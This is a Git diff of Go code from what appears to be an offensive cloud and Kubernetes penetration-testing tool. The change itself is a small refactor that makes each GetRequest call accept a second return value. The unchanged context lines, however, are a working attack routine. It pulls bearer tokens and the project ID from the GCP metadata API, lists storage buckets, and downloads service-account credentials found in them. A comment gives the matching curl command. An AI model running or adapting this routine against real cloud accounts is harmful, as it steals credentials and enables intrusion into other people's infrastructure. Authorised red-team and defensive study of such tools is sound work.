@@ -27,7 +27,7 @@ func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error)
 	baseURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
 	urlSvcAccount := baseURL + account + "/token"
 
-	reqTokenRaw := GetRequest(urlSvcAccount, headers, false)
+	reqTokenRaw, _ := GetRequest(urlSvcAccount, headers, false)
 
 	// TODO: Add a check for a 200 status code
 	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
@@ -92,7 +92,7 @@ func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
 	headers = []HeaderLine{
 		HeaderLine{"Metadata-Flavor", "Google"},
 	}
-	projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
+	projectID, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
 	if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
 		msg := "[-] Could not get GCP project from metadata API"
 		println(msg)
@@ -108,7 +108,7 @@ func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
 
 	// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
 	urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
-	bucketListRaw := GetRequest(urlListBuckets, headers, false)
+	bucketListRaw, _ := GetRequest(urlListBuckets, headers, false)
 	if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
 		msg := "[-] blank bucket list or error retriving bucket list"
 		println(msg)
@@ -132,7 +132,7 @@ eachbucket:
 	for _, line := range bucketUrls {
 		println("Checking bucket for credentials:", line)
 		urlListObjects := line + "/o"
-		bodyListObjects := GetRequest(urlListObjects, headers, false)
+		bodyListObjects, _ := GetRequest(urlListObjects, headers, false)
 		if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
 			continue
 		}
@@ -152,7 +152,7 @@ eachbucket:
 					saTokenURL := objectURL + "?alt=media"
 
 					// We use the same headers[] from the previous GET request.
-					bodyToken := GetRequest(saTokenURL, headers, false)
+					bodyToken, _ := GetRequest(saTokenURL, headers, false)
 					if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
 						continue eachbucket
 					}
